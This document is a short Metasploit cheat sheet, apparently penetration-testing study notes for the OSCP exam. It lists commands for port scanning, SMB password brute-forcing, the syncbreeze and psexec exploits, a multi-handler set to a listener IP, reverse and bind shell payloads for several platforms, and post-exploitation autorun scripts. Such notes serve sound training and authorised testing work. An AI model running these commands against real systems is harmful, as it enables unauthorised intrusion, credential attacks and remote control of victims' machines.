# Useful modules

### Auxiliary Modules

```bash
# TCP Port scanner
use scanner/portscan/tcp	
	set rhosts

# Detects if system supports SMB 2.0
use scanner/smb/smb2		
	set rhosts

# SMB login brute forcer
use scanner/smb/smb_login	
    set rhosts			
    set smbdomain		
    set threads			# Number of concurrent attempts
    # You can either try a single user/pass with these
    set smbuser			
    set smbpass 		
    # Or generate a list to try with this
    set userpassfile	# file with users and passwords separated by space, one pair per line

# RDP port scanner
use scanner/rdp/rdp_scanner		
	set rhosts

# Autoroute manager
use multi/manage/autoroute
	set session

# SOCKS4 proxy
use auxiliary/server/socks4a
	set session
```

### Recon Modules

```bash
# From an already established meterpreter prompt:
bg
use multi/recon/local_exploit_suggester
run
```

### Multi Handler

```bash
use exploit/multi/handler
    set LHOST 192.168.119.216
    set LPORT 8000
# You must tell the multi-handler what kind of payload to expect
    # Reverse HTTPS
    set payload windows/meterpreter/reverse_https
    # Reverse TCP
    set payload windows/meterpreter/reverse_tcp
run
```

### Exploit Modules

```bash
# Syncbreeze, the poster child of OSCP
use exploit/windows/http/syncbreeze_bof

# Exploit SMB to run code
use exploit/windows/smb/psexec
	set rhosts
	set SMBDomain
	set SMBUser
	set SMBPass
```

### Payloads

Modules select a default payload but it's better to select one.

#### Compatible Payloads

```bash
show payloads
```

#### Windows

```bash
# Note Reverse shells start their own listeners in MSF
# TCP Reverse Shell
set payload windows/shell_reverse_tcp

# Meterpreter HTTP Reverse Shell
set payload windows/meterpreter/reverse_http

# Meterpreter Bind TCP SHell
set payload windows/meterpreter/bind_tcp
```

#### Linux

```bash
# Meterpreter
set payload linux/x64/meterpreter/bind_tcp
set payload linux/x64/meterpreter/reverse_tcp
```

#### Others

```bash
# Reverse VNC Connection
set payload vncinject/reverse_http

# Reverse PHP shell
set payload php/reverse-php 

# Z/OS Mainframe reverse shell
set payload mainframe/reverse_shell_jcl
```

### Auto-Run Scripts

```bash
# Enumerate users
set AutoRunScript windows/gather/enum_logged_on_users

# Migrate from one process to another more stable one.  Good when injected into PE's that will close on completion
set AutoRunScript post/windows/manage/migrate
```

